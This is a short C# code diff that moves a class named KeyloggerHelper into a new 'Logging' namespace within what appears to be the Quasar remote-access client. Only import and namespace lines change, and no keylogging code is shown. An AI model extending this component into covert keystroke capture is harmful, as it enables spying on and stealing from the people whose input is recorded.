@@ -1,7 +1,8 @@
 ﻿using System.Collections.Generic;
 using System.Windows.Forms;
+using Quasar.Client.Helper;
 
-namespace Quasar.Client.Helper
+namespace Quasar.Client.Logging
 {
     public static class KeyloggerHelper
     {
